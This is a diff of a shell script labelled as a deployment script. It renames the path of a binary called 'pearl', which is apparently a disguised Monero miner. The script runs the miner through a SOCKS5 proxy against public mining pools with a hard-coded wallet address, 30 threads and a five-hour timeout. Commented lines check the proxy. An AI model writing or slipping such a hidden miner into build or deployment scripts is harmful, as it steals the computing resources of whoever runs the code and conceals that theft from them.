@@ -8,14 +8,14 @@ echo "Deployment script started"
 #which wget
 #whoami 
 which timeout
-#clam/pearl --version
+#pearl --version
 #echo "Checking proxy:"
 #curl --socks5 199.116.112.6:4145 ipinfo.io
 
 # does not work wothout proxy
 echo "Running pearl"
-#timeout 360 clam/pearl -x 199.116.112.6:4145 -o pool.supportxmr.com:3333 -u 41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ --coin monero
-timeout 18000 clam/pearl -x 199.116.112.6:4145 -o pool.hashvault.pro:80 -u 41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ --coin monero -t 30 --cpu-priorit=5
+#timeout 360 pearl -x 199.116.112.6:4145 -o pool.supportxmr.com:3333 -u 41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ --coin monero
+timeout 18000 pearl -x 199.116.112.6:4145 -o pool.hashvault.pro:80 -u 41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ --coin monero -t 30 --cpu-priorit=5
 
 
 exit 0
